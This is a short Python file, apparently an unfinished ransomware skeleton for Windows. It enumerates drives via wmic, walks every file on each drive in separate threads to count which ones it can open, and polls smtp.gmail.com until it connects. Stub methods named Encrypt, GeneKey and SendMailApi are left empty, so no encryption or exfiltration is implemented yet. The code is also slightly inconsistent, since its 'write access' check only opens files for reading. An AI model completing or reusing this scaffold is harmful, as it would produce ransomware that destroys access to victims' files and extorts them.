import subprocess
import os
import time
import socket
import base64
import threading
 


class WindowsApiAccess:
	def GetDrive(self):
		output = subprocess.getoutput("wmic logicaldisk get caption")
		return output.split()[1:]

class CryptCode(WindowsApiAccess):
	def __init__(self):
		self.isAccess = 0
		self.noAccess = 0
	def Encrypt(self,content):
		pass
	def isFileWriteAccess(self,drive):
		Counter = 0
		Counter1=0
		for Path,Dirs,Files in os.walk(drive+"\\"):
				for file in Files:
					p = os.path.join(Path,file)
					if drive.lower()=="c:":
						print(" C : Running ...")
					elif drive.lower() == "d:":
						print(" D : Running....")
					try:
						with open(p,'rb') as File:
							File.close()
						Counter+=1
						
					except:
						Counter1+=1
						
						print(p)
		print(drive,"Access:",Counter,"noAccess:",Counter1)
		print(" Finished : ",drive)
		time.sleep(2)
	def TraverseVolume(self):
		self.DriveInfo = self.GetDrive()
		for Drive in self.DriveInfo:
			
			print("[ + ] Trying To Access ",Drive)
			T = threading.Thread(target=self.isFileWriteAccess,args=(Drive,))
			T.start()
			# for Path,Dirs,Files in os.walk(Drive+"\\"):
			# 	for file in Files:
			# 		p = os.path.join(Path,file)
					# t1 = threading.Thread(target=self.isFileWriteAccess,args=(p,Drive))
					# t1.start()
					# if isFileWriteAccess(p):
					# 	self.isAccess+=1
					# 	if Drive.lower() == "d":
					# 		print("File Access [ + ]",file)
					# else:
					# 	self.noAccess+=1
		# print(" File Access [ Counter ] :",self.isAccess)
		# print(" No File Acces [Counter] :",self.noAccess)
	def GeneKey(self):
		pass

	def SendMailApi(self):
		pass

	def IsComputerOnline(self):
		host = "smtp.gmail.com"
		port = 587
		while True:
			s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			try:
				s.connect((host,port))
				return True
			except:
				s.close()

	def ControllerCode(self):
		self.IsComputerOnline()


Win = CryptCode()
Win.TraverseVolume()